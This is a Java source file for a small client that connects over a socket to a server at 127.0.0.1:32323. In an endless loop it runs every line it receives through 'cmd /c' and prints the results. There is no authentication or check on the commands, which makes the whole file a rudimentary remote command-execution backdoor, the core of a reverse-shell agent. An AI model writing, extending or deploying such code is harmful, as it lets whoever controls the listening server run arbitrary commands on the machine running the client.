import java.net.*;
import java.io.*;
public class client {
    Socket sock;    
    PrintStream ps;
    BufferedReader din;    
    InputStream is;
    public static void main(String[] args) throws Exception {
        new client();
    }
    public client() {
        try {
            sock = new Socket("127.0.0.1", 32323);
            ps = new PrintStream(sock.getOutputStream());
            din = new BufferedReader(new InputStreamReader(sock.getInputStream()));
            is = sock.getInputStream();
            //ps.println("HELLO");
            //run(input);
            while(true) {
                String line = din.readLine();
                try {
                    Runtime rt = Runtime.getRuntime();
                    Process proc = rt.exec("cmd /c " + line);
                    BufferedReader stdInput = new BufferedReader(new 
                         InputStreamReader(proc.getInputStream()));
                    BufferedReader stdError = new BufferedReader(new 
                         InputStreamReader(proc.getErrorStream()));
                    // read the output from the command
                    System.out.println("Here is the standard output of the command:\n");
                    String s = null;
                    while ((s = stdInput.readLine()) != null) {
                        System.out.println(s);
                    }
                    // read any errors from the attempted command
                    System.out.println("Here is the standard error of the command (if any):\n");
                    while ((s = stdError.readLine()) != null) {
                        System.out.println(s);
                    }
                    //Runtime.getRuntime().exec("cmd /c " + line);
                } catch (Exception e) {
                    e.printStackTrace();
                }  
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
